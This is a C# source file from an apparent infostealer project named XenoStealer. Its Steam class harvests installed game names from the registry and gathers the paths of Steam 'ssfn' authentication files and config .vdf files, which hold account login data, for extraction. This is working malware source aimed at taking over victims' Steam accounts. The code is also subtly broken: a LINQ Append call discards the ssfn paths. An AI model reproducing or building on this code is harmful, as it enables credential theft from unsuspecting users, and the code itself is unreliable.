using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace XenoStealer
{
    public static class Steam
    {
        public static DataExtractionStructs.SteamInfo? GetInfo() 
        {
            List<string> games = new List<string>();
            string SteamPath = null;
            foreach (RegistryView view in new RegistryView[] { RegistryView.Registry64, RegistryView.Registry32 })
            {
                try
                {
                    using (RegistryKey CurrentUserX = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, view))
                    {
                        string path = "Software\\Valve\\Steam";
                        using (RegistryKey OpenedKey = CurrentUserX.OpenSubKey(path))
                        {
                            string temp_steamPath = OpenedKey.GetValue("SteamPath").ToString();
                            if (temp_steamPath == null)
                            {
                                continue;
                            }
                            SteamPath = temp_steamPath;
                            using (RegistryKey AppsKey = OpenedKey.OpenSubKey("Apps"))
                            {
                                foreach (string AppID in AppsKey.GetSubKeyNames())
                                {
                                    using (RegistryKey AppData = AppsKey.OpenSubKey(AppID))
                                    {
                                        object gameName = AppData.GetValue("Name");
                                        if (gameName != null)
                                        {
                                            games.Add(gameName.ToString());
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                catch
                {
                }
                if (SteamPath != null)
                {
                    break;
                }
            }
            if (SteamPath == null || !Directory.Exists(SteamPath))
            {
                return null;
            }

            List<string> ssnfFiles = new List<string>();
            List<string> vdfFiles = new List<string>();

            foreach (string file in Directory.GetFiles(SteamPath))
            {
                if (file.Contains("ssfn"))
                {
                    ssnfFiles.Append(Path.GetFullPath(file));
                }
            }

            string configPath = Path.Combine(SteamPath, "config");

            if (Directory.Exists(configPath))
            {
                foreach (string file in Directory.GetFiles(configPath))
                {
                    if (file.EndsWith("vdf"))
                    {
                        vdfFiles.Add(Path.GetFullPath(file));
                    }
                }
            }

            return new DataExtractionStructs.SteamInfo(games.ToArray(), ssnfFiles.ToArray(), vdfFiles.ToArray());

        }
    }
}
